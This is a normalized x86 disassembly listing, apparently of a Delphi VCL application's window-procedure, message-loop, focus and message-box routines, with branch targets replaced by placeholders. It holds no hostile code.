push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_414108
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45c420
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c7b0
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45b3dc
mov eax [ rw-data ]
call sub_45ba24
sub_45c478
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c4d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c4dc
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4040f0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45c4e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45c520
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45cc70
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45c56c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_45cc26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45c420
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45d68c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_414108
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_443c60
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45e608
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45d1a8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45d14c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_443c60
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cc70
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45ba24
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45c4e4
pop ecx
jmp [ eax * 4 + jump_table_45c610 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_443c60
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45d024
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448568
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45c478
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41a374
jmp r-xdata
xor eax eax
call sub_4543a4
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_443c60
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43e62c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cc8c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45c4e4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_459c24
jmp r-xdata
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
push ebp
call sub_45c520
pop ecx
jmp r-xdata
push ebp
call sub_45c4e4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c384
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cd3c
jmp r-xdata
jmp r-xdata
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c374
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c384
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c37c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_454254
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
call sub_454308
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45c4e4
pop ecx
jmp r-xdata
call sub_4335f0
call sub_43372c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d28c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45cc8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45c374
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45bca4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_443c60
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_443c60
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45cd3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45bca4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_443c60
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45c384
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_443c60
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_4579b0
mov eax [ ebx + 0x44 ]
call sub_459dcc
sub_45ce3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45ce78
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f4c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403fe8
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45cec4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45cee8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45cf38
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43a310
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_443c60
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45cff0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45df50
sub_45d024
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_443c60
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403320
test al al
jne r-xdata
sub_45d090
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45cff0
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45cee8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45cf38
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45cec4
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45d128
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d090
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45d9f8
sub_45d14c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4140e8
mov eax 0x8
call sub_4026e4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413fac
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45d1a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_414108
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402704
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413ff8
jmp r-xdata
sub_45d23c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4035c4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_443c3c
mov [ esi + 0x44 ] edi
sub_45d2bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45d39a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_4541cc
call sub_407b0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d3a1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_4579b0
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4035c4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45d128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_4568b8
mov eax [ ebp - 0x4 ]
call sub_45cc8c
jmp r-xdata
sub_45d3bc
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402774
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402794
push eax
call sub_402774
pop edx
call sub_40b5a0
call sub_402774
mov edx [ rw-data ]
call sub_4032b0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402774
mov edx eax
mov eax ebx
call sub_45d5b4
pop esi
pop ebx
retn
call sub_402774
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45d44c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_454254
mov [ ebp - 0x10 ] eax
call sub_454170
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45c3f0
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45d5a1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d5a8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_454308
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_454178
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45d5b4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d66f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f90
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45ce78
mov eax [ ebp - 0x108 ]
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
mov edx eax
mov eax ebx
pop ecx
call sub_45d44c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d676
lea eax [ ebp - 0x108 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
call sub_408470
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c34
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a4c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041c0
sub_45d68c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
